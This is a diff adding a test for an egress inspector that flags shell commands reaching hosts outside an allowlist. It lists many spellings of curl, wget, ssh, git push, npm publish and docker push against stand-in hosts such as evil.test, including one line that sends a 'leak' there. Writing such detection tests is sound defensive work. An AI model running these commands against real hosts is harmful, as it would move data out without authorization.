@@ -490,6 +490,47 @@ check('egress: a data-only command carries URLs as prose', () => {
   assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git clone https://evil.test/r.git' }, allowlist: ['ok.test'] })?.host, 'evil.test')
   assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git push origin main' }, allowlist: ['ok.test'] })?.opaque, true)
 })
+check('egress: the command head is recognized in every spelling a shell accepts', () => {
+  // Found by the end-to-end run, not by imagination: the real call was
+  // `curl.exe --max-time 3 shadow-e2e.invalid`, and every one of these
+  // spellings put the client somewhere the anchored patterns could not see it.
+  const asks = [
+    'curl.exe --max-time 3 shadow-e2e.invalid',
+    'curl.exe shadow-e2e.invalid',
+    'wget.exe -q evil.test',
+    'git.exe push',
+    'npm.cmd publish',
+    'yarnpkg publish',
+    'docker.exe push repo:tag',
+    'ssh.exe evil.test',
+    '& curl.exe evil.test',
+    'C:\\Windows\\System32\\curl.exe evil.test',
+    'cmd /c curl evil.test',
+    'cmd.exe /c curl evil.test',
+    'C:\\Windows\\System32\\cmd.exe /c curl.exe evil.test',
+    'powershell -c "cmd /c curl evil.test"',
+    '& "curl.exe" evil.test',
+    'powershell -c "curl evil.test"',
+    'pwsh -c "wget evil.test"',
+    'bash -lc "ssh evil.test"',
+    'echo $(curl.exe https://evil.test/leak)',
+    'git.exe clone https://evil.test/r.git',
+  ]
+  for (const command of asks) {
+    assert.notEqual(inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: ['ok.test'] }), undefined, command)
+  }
+  // The same words in a data-only command stay prose, suffix or not.
+  const quiet = [
+    'git.exe commit -m "docs: curl and ssh usage"',
+    'git.exe status --short',
+    'echo "run cmd /c dir to list"',
+    'bash -c "echo all good"',
+    'Write-Output "see https://evil.test for notes"',
+  ]
+  for (const command of quiet) {
+    assert.equal(inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: ['ok.test'] }), undefined, command)
+  }
+})
 check('egress: a wrapper before the command does not hide it', () => {
   for (const command of ['sudo curl evil.test', 'env TOKEN=1 curl evil.test', '& curl evil.test']) {
     assert.equal(inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: [] })?.opaque, true, command)
